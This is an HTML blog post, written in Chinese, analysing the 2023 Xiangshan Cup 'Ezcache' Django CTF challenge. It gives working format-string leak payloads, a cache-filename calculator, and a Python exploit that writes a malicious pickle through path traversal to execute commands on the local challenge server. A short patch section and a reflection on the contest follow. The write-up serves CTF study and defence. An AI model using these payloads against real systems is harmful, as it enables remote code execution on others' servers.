@@ -1,0 +1,386 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[2023香山杯决赛]Ezcache | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1711466907097">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[2023香山杯决赛]Ezcache | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+第一次的线下AWDP的复盘与总结
+
+环境复现
+题目docker：https://pan.baidu.com/s/1ZgNYC7FkTt7Oe_RQYSGrhQ 提取码: wiwn
+构建 &amp; 启动
+docker build -t e..." />
+    <meta name="keywords" content="AWDP,Django,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1711466907097" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    sky, blue and ...
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://skyblu3519.github.io/post/you-lian" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [2023香山杯决赛]Ezcache
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-04
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/9Qf8hs-Lp/" class="post-tag">
+                  # AWDP
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/AWUH_nI8AN/" class="post-tag">
+                  # Django
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023-xiang-shan-bei-jue-sai-ezcache.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <blockquote>
+<p>第一次的线下AWDP的复盘与总结</p>
+</blockquote>
+<h1 id="环境复现">环境复现</h1>
+<p>题目docker：<a href="https://pan.baidu.com/s/1ZgNYC7FkTt7Oe_RQYSGrhQ">https://pan.baidu.com/s/1ZgNYC7FkTt7Oe_RQYSGrhQ</a> 提取码: wiwn</p>
+<p>构建 &amp; 启动</p>
+<pre><code class="language-dockerfile">docker build -t ezcache .
+docker run -d -p 8000:8000 ezcache 
+</code></pre>
+<h1 id="解题思路">解题思路</h1>
+<p>题目有两个路由，<code>/generate</code>存在的问题有两个：格式化字符串信息泄露+任意文件写入<br>
+<img src="https://skyblu3519.github.io/post-images/1701703354253.png" alt="" loading="lazy"></p>
+<p><code>/index</code>则是由<code>cache_page</code>装饰器修饰，结合题目名称ezcache，利用点也在就在其中<br>
+<img src="https://skyblu3519.github.io/post-images/1701703378131.png" alt="" loading="lazy"></p>
+<p>下面看<code>cache_page</code>做了个什么。这里它调用了<code>decorator_from_middleware_with_args</code>给index加了一个<code>CacheMiddleware</code>的中间件<br>
+<img src="https://skyblu3519.github.io/post-images/1701703384505.png" alt="" loading="lazy"></p>
+<p>跟进Django中间件的作用方式，在<code>django.utils.decorators.make_middleware_decorator</code>可以看到，它其实是调用了中间件类的一些方法来处理请求、响应和报错等等。<br>
+<img src="https://skyblu3519.github.io/post-images/1701703391191.png" alt="" loading="lazy"></p>
+<p>下面来看<code>CacheMiddleware</code>这个中间件都做了些什么。顾名思义，<code>CacheMiddleware</code>就是Django对缓存页面机制的一种实现，它继承的<code>UpdateCacheMiddleware</code>和<code>FetchFromCacheMiddleware</code>分别实现了处理请求的<code>process_request</code>和处理响应的<code>process_response</code>方法。<br>
+<img src="https://skyblu3519.github.io/post-images/1701703416114.png" alt="" loading="lazy"></p>
+<p>在<code>django.core.cache</code>下断点调试<code>CacheMiddleware</code>的工作流程。<br>
+<img src="https://skyblu3519.github.io/post-images/1701703422476.png" alt="" loading="lazy"></p>
+<p>首先，在程序启动的时候会实例化<code>django.core.cache.CacheHandler</code>。通过<code>_create_cache</code>的调用，它会对服务器处理缓存的类进行加载。<br>
+<img src="https://skyblu3519.github.io/post-images/1701703429759.png" alt="" loading="lazy"></p>
+<p>这里选取的类则是由配置文件决定的<br>
+<img src="https://skyblu3519.github.io/post-images/1701703445909.png" alt="" loading="lazy"></p>
+<p>题目给出的是<code>django.core.cache.backends.filebased.FileBasedCache</code></p>
+<pre><code class="language-python">CACHES = {
+    'default': {
+        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
+        'LOCATION': os.environ.get('cache_path'),
+    }
+}
+</code></pre>
+<p>而用来实例化<code>FileBasedCache</code>的location，则指的是缓存文件的保存的路径。根据配置文件，它是在环境变量中配置的。<br>
+<img src="https://skyblu3519.github.io/post-images/1701703476126.png" alt="" loading="lazy"></p>
+<p>最后这个实例化的BACKEND会被赋值给<code>CacheMiddleware.cache</code><br>
+<img src="https://skyblu3519.github.io/post-images/1701703480842.png" alt="" loading="lazy"></p>
+<p>现在看下处理缓存的<code>FileBasedCache</code>里面有什么。点进去就可以看到熟悉的pickle反序列化<br>
+<img src="https://skyblu3519.github.io/post-images/1701703485731.png" alt="" loading="lazy"></p>
+<p>接下来就是如何利用，直接在<code>FileBasedCache.get</code>里面下断点。访问<code>/index</code>，在<code>get_cache_key</code>中会用<code>_generate_cache_header_key</code>计算出<code>cache_key</code>，然后调用<code>FileBasedCache.get</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/1701703515809.png" alt="" loading="lazy"></p>
+<p>在<code>FileBasedCache.get</code>中，首先会用<code>_key_to_file</code>根据<code>cache_key</code>计算出文件名。<br>
+<img src="https://skyblu3519.github.io/post-images/1701703520876.png" alt="" loading="lazy"></p>
+<p>紧接着在<code>_is_expired</code>直接就会load这个文件。<br>
+<img src="https://skyblu3519.github.io/post-images/1701703527194.png" alt="" loading="lazy"></p>
+<p>到这里一个基本的思路就有了：</p>
+<ol>
+<li>利用格式化字符串漏洞，读出环境变量中缓存文件的保存路径。</li>
+<li>根据缓存文件名的计算逻辑，自己计算出文件名称。</li>
+<li>任意文件写入，结合保存路径和文件名，将恶意类的序列化字符串写入缓存文件。</li>
+<li>访问<code>/index</code>触发<code>pickle.load(f)</code>反序列化漏洞来命令执行。</li>
+</ol>
+<h1 id="解题流程">解题流程</h1>
+<p>首先找到缓存文件的路径。比赛的时候输入了一大堆来拿到os模块，然后找环境变量。</p>
+<pre><code>{user.__init__.__globals__[total_ordering].__globals__[namedtuple].__globals__[_sys].__dict__[modules][django.contrib.staticfiles.finders].__dict__[os].__dict__[environ]}
+</code></pre>
+<p>但其实可以通过<code>{user.__class__.__dict__}</code>找到<code>request.user</code>所在的类后，通过<code>django.contrib.auth.models.AnonymousUser</code>这个属性来找<code>setting</code>模块，还可以让payload写的更简单。参考：</p>
+<pre><code>{user._groups.model._meta.default_apps.app_configs[auth].module.settings.CACHES}
+</code></pre>
+<p>找到缓存路径后，就是找计算文件名称。跟着调试一遍后就会发现，缓存文件的名称只与请求的URL有关。根据它的思路我们写出计算缓存文件名称的脚本：</p>
+<pre><code class="language-python">import hashlib
+import os
+
+
+def _generate_cache_header_key(key_prefix, url):
+    &quot;&quot;&quot;Return a cache key for the header cache.&quot;&quot;&quot;
+    url = hashlib.md5(url.encode('ascii'))
+    cache_key = 'views.decorators.cache.cache_header.%s.%s' % (
+        key_prefix, url.hexdigest())
+    return cache_key
+
+
+def default_key_func(key, key_prefix, version):
+    return '%s:%s:%s' % (key_prefix, version, key)
+
+
+def _key_to_file(key, _dir):
+    _dir = ''
+    cache_suffix = '.djcache'
+    key = default_key_func(key, '', '1')
+    return os.path.join(_dir, ''.join(
+        [hashlib.md5(key.encode()).hexdigest(), cache_suffix]))
+
+
+
+url = 'http://127.0.0.1:8000/index'
+key_prefix = ''
+_dir = '/tmp/1234567/cache'
+cache_key = _generate_cache_header_key(key_prefix, url)
+cache_key = cache_key + '.en-us' + '.UTC'
+path = _key_to_file(cache_key, _dir)
+print(path)		# /tmp/1234567/cache/6f134a4214467b7ea4185c595222780e.djcache
+</code></pre>
+<p>有了路径后就可以向缓存写入序列化的恶意类，虽然不能出网，但是服务的static目录是可以下载的，将命令执行的结果保存其中即可。参考脚本如下（使用MultipartEncoder来传入序列化后的字节串）：</p>
+<pre><code class="language-python">import requests
+import pickle
+import os
+
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+
+
+class genpoc(object):
+    def __reduce__(self):
+        s = &quot;ls / &gt;&gt; /app/static/2&quot;             # 要执行的命令
+        return (os.system, (s,))
+
+
+e = genpoc()
+poc = pickle.dumps(e)
+
+burp0_url = &quot;http://127.0.0.1:8000/generate&quot;
+burp0_headers = {
+    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,
+    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
+    &quot;Origin&quot;: &quot;http://172.22.107.245:8000&quot;,
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;,
+    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,
+    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,
+    &quot;Accept-Language&quot;: &quot;en,zh-CN;q=0.9,zh;q=0.8&quot;,
+    &quot;Connection&quot;: &quot;close&quot;
+}
+data = poc
+# 上一步的到的文件路径
+filename = &quot;../../tmp/1234567/cache/6f134a4214467b7ea4185c595222780e.djcache&quot;
+
+# 使用 MultipartEncoder 创建多部分表单数据
+multipart_data = MultipartEncoder(
+    fields={
+        'intro': 'here is your introduction',
+        'file': ('filename', poc, 'application/octet-stream'),
+        'filename': filename
+    }
+)
+
+burp0_headers['Content-Type'] = multipart_data.content_type
+
+requests.post(burp0_url, headers=burp0_headers, data=multipart_data)
+requests.get(&quot;http://127.0.0.1:8000/index&quot;)     # 访问index触发序列化
+</code></pre>
+<h1 id="fix">fix</h1>
+<p>据说fix掉格式化字符串就可以了，路径穿越修了过不了check。参考：</p>
+<pre><code class="language-python">if &quot;user&quot; in intro.lower() or &quot;{&quot; in intro.lower() or &quot;}&quot; in intro.lower():
+    return HttpResponse(&quot;can't be as admin&quot;)
+</code></pre>
+<h1 id="总结">总结</h1>
+<p>虽然就结果而言这次web确实有点难度，三道题的解题人数分别是3、3、1。但一分也没拿的我，不仅一题未解，连fix也fix不了，多少有点离谱了😢</p>
+<p>首先就是这个目录结构，做了一年的Flask，拿道这道题理所应当地以为是</p>
+<pre><code>/app
+├── templates
+│   └── index.html
+├── __init__.py
+├── models.py
+├── settings.py
+├── urls.py
+├── views.py
+└── wsgi.py
+</code></pre>
+<p>但这道Django的目录结构其实是</p>
+<pre><code>/app
+├── __init__.py
+├── app
+│   ├── __init__.py
+│   ├── models.py
+│   ├── settings.py
+│   ├── templates
+│   │   └── index.html
+│   ├── urls.py
+│   ├── views.py
+│   └── wsgi.py
+├── db.sqlite3
+├── manage.py
+└── static
+</code></pre>
+<p>所以update.sh我写成了</p>
+<pre><code class="language-shell">mv -f -b views.py /app/views.py
+chmod +x /app/views.py
+</code></pre>
+<p>甚至连文件位置都没弄明白，而且看了WP才发现我第一次修改的还是对的😭</p>
+<p>说回这道题目，其实现在看下来好像也不是很难。复现这道题的时候，其实就瞟了一下wp知道思路是cache_page+pickle反序列化，然后就自己调了，而且比赛的时候我也知道是cache_page的问题，还把这个装饰器删掉来fix。</p>
+<p>所以这道题难在哪呢？难就难在怎么在断网的环境下调通这个程序。题目给的源码结构是<br>
+<img src="https://skyblu3519.github.io/post-images/1701705353033.png" alt="" loading="lazy"></p>
+<p>因为断网环境下无法安装依赖，所以直接把它全给你了，但我完全不知道这东西怎么用......要在本地编译器调通，需要设置环境变量<code>PYTHONPATH</code>值为<code>dist-packages</code>目录的位置，像这样</p>
+<pre><code>/xxx/xxx/ezcache/dist-packages:$PYTHONPATH
+</code></pre>
+<p>Pycharm可以在启动选项里面设置。此外，这道题还需要配置个<code>cache_path</code>的环境变量<br>
+<img src="https://skyblu3519.github.io/post-images/1701705720765.png" alt="" loading="lazy"></p>
+<p>之后在<code>setting.py</code>中修改相应的路径，以<code>manage.py</code>作为程序入口，然后可以跑通了。</p>
+<p>不过还需要知道Django的启动参数是<code>runserver 0.0.0.0:8000</code>，反正这次线下怎么都是G🙃</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83%E5%A4%8D%E7%8E%B0">环境复现</a></li>
+<li><a href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">解题思路</a></li>
+<li><a href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B">解题流程</a></li>
+<li><a href="#fix">fix</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/blue-skies-recording/">
+              <h3 class="post-title">
+                BLUE SKIES RECORDING
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
